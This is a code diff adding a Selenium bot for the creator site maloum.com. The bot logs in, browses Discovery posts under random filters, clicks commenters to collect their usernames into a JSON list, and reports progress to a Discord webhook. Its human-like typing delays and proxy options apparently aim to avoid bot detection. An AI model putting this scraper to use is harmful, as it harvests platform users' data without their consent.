+                best_candidate = max(all_users_candidates, key=lambda x: x['count'])
+                maloum_count = best_candidate['count']
+                json_count = len(existing_users)
+                
+                if len(all_users_candidates) > 1:
+                    log_info(f"Found {len(all_users_candidates)} lists, using highest: {maloum_count}")
+                
+                log_info(f"Maloum count: {maloum_count}")
+                log_info(f"JSON count: {json_count}")
+                
+                if json_count >= maloum_count:
+                    log_success("JSON file has equal or more users - sync not needed")
+                    return True
+                else:
+                    log_info(f"JSON has fewer users, syncing from Maloum...")
+                    
+                    # Click on the best candidate
+                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", best_candidate['button'])
+                    time.sleep(1)
+                    best_candidate['button'].click()
+                    time.sleep(3)
+                    
+                    # Now collect users from All Users list
+                    maloum_users = set()
+                    try:
+                        # Get the right column container
+                        right_column = WebDriverWait(driver, 10).until(
+                            EC.presence_of_element_located((By.CSS_SELECTOR, "#rightColumn"))
+                        )
+                        
+                        # Find users container
+                        users_container = WebDriverWait(driver, 10).until(
+                            EC.presence_of_element_located((By.CSS_SELECTOR, 
+                            "#rightColumn > div.hidden.h-full.md\\:block > div > div > div.mt-4.pb-12 > div.relative.mt-4.flex.flex-col.gap-3"))
+                        )
+                        
+                        log_info("Collecting usernames from All Users list...")
+                        
+                        # Scroll to load all users
+                        scroll_confirmations = 0
+                        last_height = 0
+                        
+                        while scroll_confirmations < 5:
+                            current_height = driver.execute_script("return arguments[0].scrollHeight", right_column)
+                            driver.execute_script("arguments[0].scrollTop = arguments[0].scrollHeight", right_column)
+                            time.sleep(1)
+                            new_height = driver.execute_script("return arguments[0].scrollHeight", right_column)
+                            
+                            if new_height == last_height:
+                                scroll_confirmations += 1
+                            else:
+                                scroll_confirmations = 0
+                                last_height = new_height
+                        
+                        # Go back to top and collect usernames
+                        driver.execute_script("arguments[0].scrollTop = 0", right_column)
+                        time.sleep(2)
+                        
+                        processed_positions = set()
+                        
+                        while True:
+                            current_position = driver.execute_script("return arguments[0].scrollTop", right_column)
+                            max_scroll = driver.execute_script("return arguments[0].scrollHeight - arguments[0].clientHeight", right_column)
+                            
+                            # Find username elements
+                            user_elements = users_container.find_elements(By.CSS_SELECTOR, 
+                                "div.flex.min-h-\\[2\\.625rem\\].justify-between.gap-3 a div.text-left div:first-child")
+                            
+                            if not user_elements:
+                                break
+                            
+                            users_collected = 0
+                            for user_element in user_elements:
+                                try:
+                                    username = user_element.text.strip()
+                                    if username and username not in maloum_users:
+                                        maloum_users.add(username)
+                                        users_collected += 1
+                                except:
+                                    continue
+                            
+                            if users_collected == 0:
+                                break
+                            
+                            if current_position >= max_scroll:
+                                break
+                            
+                            if current_position in processed_positions:
+                                break
+                            
+                            processed_positions.add(current_position)
+                            driver.execute_script("arguments[0].scrollTop += 500", right_column)
+                            time.sleep(0.5)
+                            
+                            new_position = driver.execute_script("return arguments[0].scrollTop", right_column)
+                            if new_position == current_position:
+                                break
+                        
+                        log_success(f"Collected {len(maloum_users)} users from Maloum")
+                        
+                        # Update JSON
+                        updated_users = existing_users.union(maloum_users)
+                        save_users_to_json(updated_users, config.email)
+                        
+                        log_success(f"Updated JSON with {len(updated_users)} total users")
+                        data = {"content": f"Current 'All Users' list members: {len(updated_users)}","username": "FanFindr"}
+                        webhook_url = get_discord_webhook()
+                        if webhook_url:
+                            Response = requests.post(webhook_url, json=data)
+                        return True
+                        
+                    except Exception as e:
+                        log_error("Failed to collect users")
+                        return False
+            else:
+                log_error("Could not find All Users list")
+                return False
+                
+        except Exception as e:
+            log_error("Failed to check updated count")
+            return False
+        
+    except Exception as e:
+        log_error("Sync process failed")
+        return False
+
+def login_to_maloum(driver, config):
+    """Handle the login process to Maloum with enhanced debugging"""
+    try:
+        log_info("Navigating to maloum.com (English version)...")
+        # Force English version with language parameters
+        driver.get("https://www.maloum.com/en?lang=en&hl=en")
+        
+        if not config.headless:
+            # Force window to be visible and properly sized
+            force_chrome_visible(driver)
+            # Additional visibility measures
+            driver.execute_script("window.focus();")
+            time.sleep(0.5)
+
+        # Aggressive JavaScript language forcing
+        driver.execute_script("""
+            // Override navigator language properties
+            Object.defineProperty(navigator, 'language', {get: function() {return 'en-US';}});
+            Object.defineProperty(navigator, 'languages', {get: function() {return ['en-US', 'en'];}});
+            Object.defineProperty(navigator, 'userLanguage', {get: function() {return 'en-US';}});
+            Object.defineProperty(navigator, 'systemLanguage', {get: function() {return 'en-US';}});
+            Object.defineProperty(navigator, 'browserLanguage', {get: function() {return 'en-US';}});
+            
+            // Override Intl locale detection
+            if (typeof Intl !== 'undefined') {
+                const originalDateTimeFormat = Intl.DateTimeFormat;
+                Intl.DateTimeFormat = function(...args) {
+                    args[0] = args[0] || 'en-US';
+                    return originalDateTimeFormat.apply(this, args);
+                };
+                
+                const originalNumberFormat = Intl.NumberFormat;
+                Intl.NumberFormat = function(...args) {
+                    args[0] = args[0] || 'en-US';
+                    return originalNumberFormat.apply(this, args);
+                };
+            }
+            
+            // Set document language
+            document.documentElement.lang = 'en-US';
+            
+            // Override timezone to US Eastern (common for English interfaces)
+            if (typeof Intl !== 'undefined' && Intl.DateTimeFormat) {
+                Object.defineProperty(Intl.DateTimeFormat.prototype, 'resolvedOptions', {
+                    value: function() {
+                        const options = originalDateTimeFormat.prototype.resolvedOptions.call(this);
+                        options.locale = 'en-US';
+                        options.timeZone = options.timeZone || 'America/New_York';
+                        return options;
+                    }
+                });
+            }
+        """)
+
+        # Handle cookie consent
+        try:
+            cookie_btn = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, "cmpbntyestxt")))
+            cookie_btn.click()
+            log_success("Cookie consent accepted.")
+            time.sleep(2)
+        except:
+            log_info("No cookie popup found or already accepted.")
+
+        # Click login button
+        try:
+            login_btn = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#w-node-_3bce429c-06f2-53cc-882e-3e390d408fec-3e573e94 > div:nth-child(2) > a.button.header-login-button.w-inline-block > div")))
+            login_btn.click()
+            log_success("Login button clicked.")
+            keep_chrome_visible(driver)  # Keep window visible after navigation
+            time.sleep(5)  # Give more time for page to load
+        except:
+            log_error("Login button not found.", critical=True)
+            return False
+
+        # Debug: Check what's on the page after clicking login
+        log_info(f"Current URL after login button click: {driver.current_url}")
+        
+        # Wait longer for the login form to appear
+        try:
+            WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.CSS_SELECTOR, "form")))
+            log_info("Login form detected")
+        except:
+            log_error("Login form not found after clicking login button")
+            # Debug: Print page source snippet to see what's there
+            try:
+                page_source = driver.page_source
+                if "form" in page_source.lower():
+                    log_info("Form element exists in page source")
+                else:
+                    log_error("No form element in page source")
+                    
+                # Check for common form input elements
+                if 'input[name="usernameOrEmail"]' in page_source or 'name="usernameOrEmail"' in page_source:
+                    log_info("Username input field found in page source")
+                else:
+                    log_error("Username input field NOT found in page source")
+                    
+            except Exception as debug_e:
+                log_error(f"Debug error: {debug_e}")
+            return False
+        
+        # Try to find username field with multiple approaches
+        log_info("Looking for username/email field...")
+        username_element = None
+        
+        # Method 1: By name attribute (most reliable)
+        try:
+            username_element = WebDriverWait(driver, 5).until(
+                EC.presence_of_element_located((By.CSS_SELECTOR, 'input[name="usernameOrEmail"]'))
+            )
+            log_success("Username field found by name attribute")
+        except:
+            log_error("Username field not found by name attribute")
+            
+            # Method 2: By placeholder text
+            try:
+                username_element = WebDriverWait(driver, 5).until(
+                    EC.presence_of_element_located((By.CSS_SELECTOR, 'input[placeholder*="email"]'))
+                )
+                log_success("Username field found by placeholder")
+            except:
+                log_error("Username field not found by placeholder")
+                
+                # Method 3: By type
+                try:
+                    username_element = WebDriverWait(driver, 5).until(
+                        EC.presence_of_element_located((By.CSS_SELECTOR, 'input[type="text"]'))
+                    )
+                    log_success("Username field found by type")
+                except:
+                    log_error("Username field not found by any method")
+        
+        if not username_element:
+            log_error("Could not locate username field", critical=True)
+            return False
+            
+        # Try to find password field
+        log_info("Looking for password field...")
+        password_element = None
+        
+        # Method 1: By name attribute
+        try:
+            password_element = WebDriverWait(driver, 5).until(
+                EC.presence_of_element_located((By.CSS_SELECTOR, 'input[name="password"]'))
+            )
+            log_success("Password field found by name attribute")
+        except:
+            log_error("Password field not found by name attribute")
+            
+            # Method 2: By type
+            try:
+                password_element = WebDriverWait(driver, 5).until(
+                    EC.presence_of_element_located((By.CSS_SELECTOR, 'input[type="password"]'))
+                )
+                log_success("Password field found by type")
+            except:
+                log_error("Password field not found by any method")
+        
+        if not password_element:
+            log_error("Could not locate password field", critical=True)
+            return False
+        
+        # Fill in the credentials
+        log_info("Filling in credentials...")
+        try:
+            # Clear and fill username
+            username_element.clear()
+            time.sleep(0.5)
+            for char in config.email:
+                username_element.send_keys(char)
+                time.sleep(0.05)
+            log_success("Username entered")
+            
+            # Clear and fill password  
+            password_element.clear()
+            time.sleep(0.5)
+            for char in config.password:
+                password_element.send_keys(char)
+                time.sleep(0.05)
+            log_success("Password entered")
+            
+        except Exception as e:
+            log_error(f"Error filling credentials: {e}", critical=True)
+            return False
+        
+        # Find and click submit button
+        log_info("Looking for submit button...")
+        submit_element = None
+        
+        # Method 1: Button with type submit
+        try:
+            submit_element = WebDriverWait(driver, 5).until(
+                EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[type="submit"]'))
+            )
+            log_success("Submit button found by type")
+        except:
+            log_error("Submit button not found by type")
+            
+            # Method 2: Any button in form
+            try:
+                submit_element = WebDriverWait(driver, 5).until(
+                    EC.element_to_be_clickable((By.CSS_SELECTOR, 'form button'))
+                )
+                log_success("Submit button found as form button")
+            except:
+                log_error("Submit button not found by any method")
+        
+        if not submit_element:
+            log_error("Could not locate submit button", critical=True)
+            return False
+        
+        # Click submit button
+        try:
+            submit_element.click()
+            log_success("Submit button clicked")
+        except Exception as e:
+            log_error(f"Error clicking submit button: {e}", critical=True)
+            return False
+
+        # Wait for login to complete
+        log_info("Waiting for login completion...")
+        try:
+            # Wait for URL change or dashboard elements
+            WebDriverWait(driver, 15).until(
+                lambda d: d.current_url != "https://www.maloum.com/en" or len(d.find_elements(By.CSS_SELECTOR, "nav")) > 0
+            )
+            
+            final_url = driver.current_url
+            log_success(f"Login completed successfully. Final URL: {final_url}")
+            keep_chrome_visible(driver)  # Keep window visible after login
+            time.sleep(2)
+            return True
+            
+        except Exception as e:
+            current_url = driver.current_url
+            log_error(f"Login timeout. Current URL: {current_url}")
+            
+            # Check if still on login page
+            if current_url == "https://www.maloum.com/en":
+                log_error("Still on main page - login may have failed")
+            
+            return False
+        
+    except Exception as e:
+        log_error(f"Login process failed with exception: {e}", critical=True)
+        return False
+def go_to_discovery_page(driver, config):
+    """Navigate to Discovery page"""
+    try:
+        log_info("Navigating to Discovery page...")
+        
+        # Try clicking the navigation button first
+        try:
+            discovery_btn = WebDriverWait(driver, 10).until(
+                EC.element_to_be_clickable((By.CSS_SELECTOR, 
+                "#root > div > section > div > nav > ul > li:nth-child(2) > button"))
+            )
+            discovery_btn.click()
+            # Wait for page to load
+            time.sleep(5)
+            
+            # Verify we're on discovery page
+            current_url = driver.current_url
+            if "search" in current_url:
+                log_success("Discovery page loaded via button click")
+                return True
+        except Exception as btn_error:
+            log_info(f"Button click method failed: {btn_error}")
+        
+        # If button method failed or didn't reach discovery page, try direct URL
+        log_info("Trying direct URL navigation to Discovery page...")
+        driver.get("https://app.maloum.com/search")
+        time.sleep(5)  # Wait for page to load
+        
+        # Verify we're on discovery page
+        current_url = driver.current_url
+        if "search" in current_url or "discovery" in current_url.lower():
+            log_success("Discovery page loaded via direct URL")
+            return True
+        else:
+            log_error(f"Failed to reach Discovery page via direct URL. Current URL: {current_url}")
+            log_info("Reloading page and waiting...")
+            driver.refresh()
+            time.sleep(8)  # Wait longer after refresh
+            
+            # Check again after refresh
+            current_url = driver.current_url
+            if "search" in current_url or "discovery" in current_url.lower():
+                log_success("Discovery page loaded after refresh")
+                return True
+            else:
+                log_error(f"Failed to reach Discovery page after refresh. Current URL: {current_url}")
+                return False
+            
+    except Exception as e:
+        log_error(f"Failed to navigate to Discovery page: {e}")
+        # As a last resort, try direct navigation
+        try:
+            driver.get("https://app.maloum.com/search")
+            time.sleep(5)
+            return "search" in driver.current_url
+        except:
+            return False
+
+def apply_random_filter(driver, config):
+    """Apply random filter and return to Discovery page"""
+    try:
+        log_info("Opening filter preferences...")
+        
+        # Click filter button
+        filter_btn = WebDriverWait(driver, 10).until(
+            EC.element_to_be_clickable((By.CSS_SELECTOR, 
+            "#root > div > div > div > header > div.flex.justify-between.px-4.pt-2.sm\\:pt-6 > div.my-auto.flex.md\\:gap-x-1 > a.flex.rounded-md.border-2.border-transparent.p-2.outline-none.focus\\:border-blue-violet.disabled\\:text-gray-300.text-gray-700.hover\\:text-gray-500.active\\:text-gray-800.text-base.shrink-0.hidden.sm\\:block"))
+        )
+        filter_btn.click()
+        time.sleep(3)
+        
+        # Verify we're on filter page
+        current_url = driver.current_url
+        if "preferences" not in current_url:
+            log_error("Not on filter preferences page")
+            return False
+        
+        log_info("Filter preferences page loaded")
+        
+        # Select random filter
+        filter_index = random.randint(1, 20)
+        filter_selector = f"#root > div > div > div > div.mx-auto.flex.w-full.max-w-xl.flex-col.px-4.pt-4.md\\:px-0.md\\:px-4.grow > div:nth-child(2) > div.flex.flex-wrap.gap-2 > button:nth-child({filter_index})"
+        
+        try:
+            filter_button = WebDriverWait(driver, 10).until(
+                EC.element_to_be_clickable((By.CSS_SELECTOR, filter_selector))
+            )
+            filter_button.click()
+            log_info(f"Selected filter #{filter_index}")
+            time.sleep(2)
+        except:
+            log_info("Using default filter selection")
+        
+        # Save filter
+        save_btn = WebDriverWait(driver, 10).until(
+            EC.element_to_be_clickable((By.CSS_SELECTOR, 
+            "#root > div > div > div > div.mx-auto.flex.w-full.max-w-xl.flex-col.px-4.pt-4.md\\:px-0.md\\:px-4.grow > div.sticky.bottom-0.mx-auto.mt-12.flex.w-full.max-w-xl.flex-col.bg-white.py-4 > button"))
+        )
+        save_btn.click()
+        log_info("Filter saved")
+        
+        # Wait for return to Discovery page
+        log_info("Waiting for Discovery page to reload...")
+        time.sleep(8)
+        
+        # Verify we're back on Discovery page
+        current_url = driver.current_url
+        if "search" not in current_url:
+            log_info("Not automatically returned to Discovery, navigating manually...")
+            return go_to_discovery_page(driver, config)
+        else:
+            log_success("Returned to Discovery page with new filter applied")
+            return True
+            
+    except Exception as e:
+        log_error("Filter application failed")
+        return False
+
+def find_posts(driver):
+    """Find all post elements using multiple selector strategies with crash protection"""
+    posts = []
+    selectors_to_try = [
+        # Primary selector - based on the actual Discovery page structure
+        "div.grid.grid-cols-3.gap-px > a",
+        # Alternative selectors for different layouts
+        "div.grid.grid-cols-3 > a",
+        "div[class*='grid-cols-3'] > a",
+        # Fallback selectors
+        "main a[href*='/post/']",
+        "a[href*='/post/']"
+    ]
+    
+    for selector in selectors_to_try:
+        try:
+            posts = driver.find_elements(By.CSS_SELECTOR, selector)
+            if posts:
+                log_info(f"Found {len(posts)} posts using selector: {selector}")
+                return posts
+        except Exception as e:
+            if "tab crashed" in str(e).lower():
+                log_error(f"Tab crashed while using CSS selector: {selector}")
+                return []  # Return empty list to signal a crash occurred
+            continue
+            
+    # If CSS selectors don't work, try XPath approach
+    if not posts:
+        log_info("Trying XPath approach to find post links...")
+        xpath_selectors = [
+            "//div[contains(@class, 'grid') and contains(@class, 'grid-cols-3')]//a",
+            "//main//a[contains(@href, '/post/')]",
+            "//a[contains(@href, '/post/')]"
+        ]
+        
+        for xpath in xpath_selectors:
+            try:
+                posts = driver.find_elements(By.XPATH, xpath)
+                if posts:
+                    log_info(f"Found {len(posts)} posts using XPath: {xpath}")
+                    return posts
+            except Exception as e:
+                if "tab crashed" in str(e).lower():
+                    log_error(f"Tab crashed while using XPath: {xpath}")
+                    return []  # Return empty list to signal a crash occurred
+                log_error(f"XPath '{xpath}' failed: {e}")
+                continue
+                
+        if not posts:
+            log_error("No posts found with any selector strategy!")
+    
+    return posts
+
+def wait_for_first_post(driver, config):
+    """Wait for first post to load without scrolling"""
+    try:
+        log_info("Waiting for first post to load...")
+        
+        # Wait for posts to be available
+        for attempt in range(3):
+            posts = find_posts(driver)
+            if posts:
+                log_success(f"First post loaded and ready - found {len(posts)} posts")
+                time.sleep(3)  # Additional wait for content to stabilize
+                return True
+            else:
+                log_info(f"Attempt {attempt + 1}/3 - no posts found, waiting...")
+                time.sleep(2)
+        
+        log_error("First post did not load after 3 attempts")
+        return False
+        
+    except Exception as e:
+        log_error("First post did not load")
+        return False
+
+def process_single_post(driver, post_index, config, existing_users, collected_users):
+    """Process a single post and collect users from comments"""
+    try:
+        log_info(f"Processing post #{post_index + 1}")
+        
+        # Get available posts
+        posts = find_posts(driver)
+        
+        if post_index >= len(posts):
+            log_info("No more posts available")
+            return False
+        
+        # Click the post
+        post = posts[post_index]
+        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", post)
+        time.sleep(1)
+        post.click()
+        
+        log_info(f"Opened post #{post_index + 1}")
+        time.sleep(3)
+        
+        # Look for comment button
+        try:
+            comment_elements = driver.find_elements(By.XPATH, "//button[contains(text(), 'comment')]")
+            
+            if not comment_elements:
+                log_info("No comment button found, going back")
+                driver.back()
+                time.sleep(2)
+                return True
+            
+            comment_btn = comment_elements[0]
+            comment_text = comment_btn.text.strip().lower()
+            
+            # Check for 0 comments
+            if "0 comment" in comment_text:
+                log_info("Post has 0 comments, skipping")
+                driver.back()
+                time.sleep(2)
+                return True
+            
+            # Click comment button
+            comment_btn.click()
+            log_info("Comment section opened")
+            time.sleep(3)
+            
+        except Exception as e:
+            log_info("Comment button not found, going back")
+            driver.back()
+            time.sleep(2)
+            return True
+        
+        # Check for "No comments yet" message
+        try:
+            no_comments_elements = driver.find_elements(By.CSS_SELECTOR, "div.py-8.text-center")
+            if no_comments_elements and "no comments yet" in no_comments_elements[0].text.lower():
+                log_info("No comments yet message found, going back")
+                driver.back()
+                time.sleep(2)
+                return True
+        except:
+            pass
+        
+        # Process commenters
+        users_found_in_post = process_commenters_sequentially(driver, config, existing_users, collected_users)
+        
+        if users_found_in_post > 0:
+            log_success(f"Found {users_found_in_post} new users in post #{post_index + 1}")
+        else:
+            log_info(f"No new users found in post #{post_index + 1}")
+        
+        # Return to Discovery page
+        log_info("Returning to Discovery page...")
+        discovery_btn = WebDriverWait(driver, 10).until(
+            EC.element_to_be_clickable((By.CSS_SELECTOR, 
+            "#root > div > section > div > nav > ul > li:nth-child(2) > button"))
+        )
+        discovery_btn.click()
+        time.sleep(3)
+        
+        return True
+        
+    except Exception as e:
+        log_error(f"Error processing post #{post_index + 1}")
+        
+        try:
+            driver.back()
+            time.sleep(2)
+        except:
+            pass
+        return True
+
+def process_commenters_sequentially(driver, config, existing_users, collected_users):
+    """Process all commenters in sequence (click one, navigate back to comment URL, click next, etc.)"""
+    users_found = 0
+    processed_users = set()
+    
+    # Save the comment section URL for reliable navigation back
+    comment_section_url = driver.current_url
+    log_info(f"Saved comment section URL: {comment_section_url}")
+    while True:
+        try:
+            # Get current commenters
+            commenters = driver.find_elements(By.CSS_SELECTOR, "div.flex.justify-between button.notranslate")
+            
+            if not commenters:
+                break
+            
+            # Find next unprocessed commenter
+            target_commenter = None
+            target_username = None
+            
+            for commenter in commenters:
+                username = commenter.text.strip()
+                
+                if (username and 
+                    username not in processed_users and 
+                    username not in existing_users and 
+                    username not in collected_users):
+                    target_commenter = commenter
+                    target_username = username
+                    break
+            
+            # If no new users found, break
+            if not target_commenter or not target_username:
+                break
+            
+            # Click the user
+            try:
+                driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", target_commenter)
+                time.sleep(1)
+                ActionChains(driver).move_to_element(target_commenter).click().perform()
+                
+                # Add to collections
+                collected_users.add(target_username)
+                existing_users.add(target_username)
+                processed_users.add(target_username)
+                users_found += 1
+                
+                # Save immediately                        
+                progress = (len(collected_users) / config.target_users) * 100
+                log_success(f"Collected user: {target_username} ({len(collected_users)}/{config.target_users} - {progress:.1f}%)")
+                add_user_to_json(target_username, config.email)
+                
+                # Note: Supabase will be updated with full user list when add_user_to_json calls save_users_to_json
+                # The total count will be automatically accurate based on the user list length
+                
+                data = {"content": f"New user: {target_username} ({len(collected_users)}/{config.target_users} - {progress:.1f}%)","username": "FanFindr"}
+                webhook_url = get_discord_webhook()
+                if webhook_url:
+                    Response = requests.post(webhook_url, json=data)                  
+                # Rate limiting
+                human_delay(rate_delay=config.rate_delay)
+                
+                # Navigate back to comment section using saved URL
+                log_info("Navigating back to comment section...")
+                driver.get(comment_section_url)
+                time.sleep(5)  # Wait for page to reload
+                
+                # Verify we're back in comments
+                current_url = driver.current_url
+                if "/comments" not in current_url:
+                    log_error("Failed to return to comment section")
+                    break
+                else:
+                    log_info("Successfully returned to comment section")
+                
+            except Exception as e:
+                log_error(f"Error processing user {target_username}")
+                processed_users.add(target_username)
+                # Try to navigate back to comment section
+                try:
+                    driver.get(comment_section_url)
+                    time.sleep(5)
+                except:
+                    pass
+                continue
+            
+        except Exception as e:
+            log_error(f"Error in commenter processing loop")
+            break
+    
+    return users_found
+
+def main_discovery_loop(driver, config, existing_users, collected_users):
+    """Main loop that processes filters and posts until target is reached"""
+    filter_cycle = 0
+    
+    while len(collected_users) < config.target_users:
+        filter_cycle += 1
+        progress = (len(collected_users) / config.target_users) * 100
+        
+        log_info(f"Filter cycle #{filter_cycle} - Progress: {len(collected_users)}/{config.target_users} ({progress:.1f}%)")        
+        # Step 1: Go to Discovery page
+        if not go_to_discovery_page(driver, config):
+            log_error("Failed to reach Discovery page, retrying...")
+            time.sleep(5)
+            continue
+        
+        # Step 2: Apply random filter
+        if not apply_random_filter(driver, config):
+            log_error("Failed to apply filter, continuing with current filter...")
+        # Step 3: Wait for first post to load
+        if not wait_for_first_post(driver, config):
+            log_error("First post did not load, trying next filter...")
+            continue
+        
+        # Step 4: Process posts sequentially
+        posts_processed_in_filter = 0
+        processed_post_elements = set()  # Keep track of processed posts by their text content
+        max_posts_per_filter = config.posts_per_filter
+        
+        while (len(collected_users) < config.target_users and 
+               posts_processed_in_filter < max_posts_per_filter):
+            
+            # Always start from index 0 after returning to Discovery page
+            # but skip posts we've already processed
+            post_found = False
+            posts = find_posts(driver)
+            
+            # Check if tab crashed during find_posts
+            if posts == []:
+                log_error("Chrome tab appears to have crashed, attempting to restart...")
+                # This indicates a crash occurred in find_posts
+                driver.refresh()
+                time.sleep(5)
+                
+                # Try to get back to discovery page
+                if not go_to_discovery_page(driver, config):
+                    log_error("Failed to return to Discovery page after crash, restarting loop...")
+                    break
+                else:
+                    log_info("Successfully returned to Discovery page after crash")
+                    continue  # Continue to next iteration of the while loop
+            
+            for post_index in range(len(posts)):
+                try:
+                    post = posts[post_index]
+                    # Get a unique identifier for this post using image src or other stable attributes
+                    img_element = post.find_element(By.TAG_NAME, "img") if post.find_elements(By.TAG_NAME, "img") else None
+                    post_src = img_element.get_attribute("src") if img_element else ""
+                    post_id = f"post_{post_index}_{hash(post_src) if post_src else hash(str(post.location))}"
+                    
+                    if post_id not in processed_post_elements:
+                        # Process this post
+                        if process_single_post(driver, post_index, config, existing_users, collected_users):
+                            processed_post_elements.add(post_id)
+                            posts_processed_in_filter += 1
+                            post_found = True
+                            # Keep Chrome visible after processing each post
+                            force_chrome_visible(driver)
+                            log_info(f"Processed post #{post_index}, total processed in this filter: {posts_processed_in_filter}")
+                            break
+                        else:
+                            # If processing failed, still mark as processed to avoid infinite loop
+                            processed_post_elements.add(post_id)
+                            break
+                except Exception as e:
+                    log_error(f"Error checking post {post_index}: {e}")
+                    continue
+            
+            # If no new posts found to process, try loading more
+            if not post_found:
+                log_info("No new posts to process, trying to load more...")
+                driver.execute_script("window.scrollBy(0, 1000);")
+                time.sleep(3)
+                
+                # Check if more posts loaded
+                new_posts = find_posts(driver)
+                
+                # Check if tab crashed during find_posts
+                if new_posts == []:
+                    log_error("Chrome tab appears to have crashed while loading more posts, attempting to restart...")
+                    driver.refresh()
+                    time.sleep(5)
+                    break  # Break and restart the filter cycle
+                
+                if len(new_posts) == len(posts):
+                    log_info("No more posts loaded, ending filter cycle")
+                    break
+        
+        log_info(f"Filter cycle #{filter_cycle} complete - processed {posts_processed_in_filter} posts")
+        # Check if target reached
+        if len(collected_users) >= config.target_users:
+            log_success("TARGET REACHED!")
+            break
+        
+        # Small delay between filter cycles
+        time.sleep(2)
+
+
+def main():
+    # Parse command line arguments
+    parser = argparse.ArgumentParser(description="Discovery Search - Simplified Flow")
+    
+    parser.add_argument("--email", required=True, help="User email")
+    parser.add_argument("--password", required=True, help="User password")
+    parser.add_argument("--target-users", type=int, help="Target number of users to collect")
+    parser.add_argument("--posts-per-filter", type=int, help="Number of posts to process per filter")
+    parser.add_argument("--headless", action="store_true", help="Run in headless mode")
+    parser.add_argument("--no-proxy", action="store_true", help="Disable proxy usage")
+    parser.add_argument("--no-fallback", action="store_true", help="Disable Chrome fallback strategies")
+    parser.add_argument("--rate-delay", type=float, help="Rate limiting delay in seconds")
+    parser.add_argument("--max-retries", type=int, help="Maximum retry attempts")
+    parser.add_argument("--timeout", type=int, help="Request timeout in seconds")
+    parser.add_argument("--gui", action="store_true", help="Running from GUI")
+    
+    args = parser.parse_args()
+    
+    try:
+        # Initialize configuration
+        config = ScriptConfig(args)
+        
+        log_info("Starting Discovery Search - Simplified Flow")
+        print("=" * 60)
+        config.print_config()
+        print("=" * 60)
+        
+        # Load existing users
+        existing_users = load_existing_users(config.email)
+        collected_users = set()
+        
+        # Setup browser
+        driver = setup_chrome_driver(config)
+        try:
+            # Login to Maloum
+            if not login_to_maloum(driver, config):
+                log_error("Login failed", critical=True)
+                return
+            # Sync All Users list before starting search
+            log_info("Synchronizing ' All Users' list...")
+            if not sync_all_users_list(driver, config, existing_users):
+                log_error("Failed to sync ' All Users' list, continuing anyway...")
+            else:
+                log_success("' All Users' list synchronized successfully")
+
+            # Reload existing_users in case it was updated during sync
+            existing_users = load_existing_users(config.email)           
+            # Start main discovery process
+            log_info("Starting main discovery process...")
+            main_discovery_loop(driver, config, existing_users, collected_users)
+            
+            # Final summary
+            log_success("Discovery Search Complete!")
+            print("=" * 60)
+            log_info(f"Users collected this session: {len(collected_users)}")
+            log_info(f"Target was: {config.target_users}")
+            
+            completion_rate = (len(collected_users) / config.target_users) * 100
+            log_success(f"Completion rate: {completion_rate:.1f}%")
+            
+            if len(collected_users) > 0:
+                # Final save
+                final_users = existing_users.union(collected_users)
+                save_users_to_json(final_users, config.email)
+                
+                log_info(f"Total users in database: {len(final_users)}")
+                log_info("Use userListManager.py to sync with Maloum")
+                
+                if not config.gui_mode:
+                    input("\nPress Enter to close...")
+            else:
+                log_info("No new users were collected this session")
+                
+        except KeyboardInterrupt:
+            log_info("Script stopped by user")
+            data = {"content": "Script stopped by user","username": "FanFindr"}
+            webhook_url = get_discord_webhook()
+            if webhook_url:
+                Response = requests.post(webhook_url, json=data)
+        except Exception as e:
+            log_error("Unexpected error", critical=True)
+        finally:
+            if driver:
+                log_info("Keeping browser open for 10 seconds for VNC preview...")
+                time.sleep(10)
+                driver.quit()
+                log_success("Browser closed")
+                data = {"content": "Browser closed","username": "FanFindR"}
+                webhook_url = get_discord_webhook()
+                if webhook_url:
+                    Response = requests.post(webhook_url, json=data)
+
+    except ValueError as e:
+        log_error("Configuration error", critical=True)
+        data = {"content": "Configuration error","username": "FanFindR"}
+        webhook_url = get_discord_webhook()
+        if webhook_url:
+            Response = requests.post(webhook_url, json=data)
+    except Exception as e:
+        log_error("Setup error", critical=True)
+        data = {"content": "Setup error","username": "FanFindR"}
+        webhook_url = get_discord_webhook()
+        if webhook_url:
+            Response = requests.post(webhook_url, json=data)
+if __name__ == "__main__":
+    main()
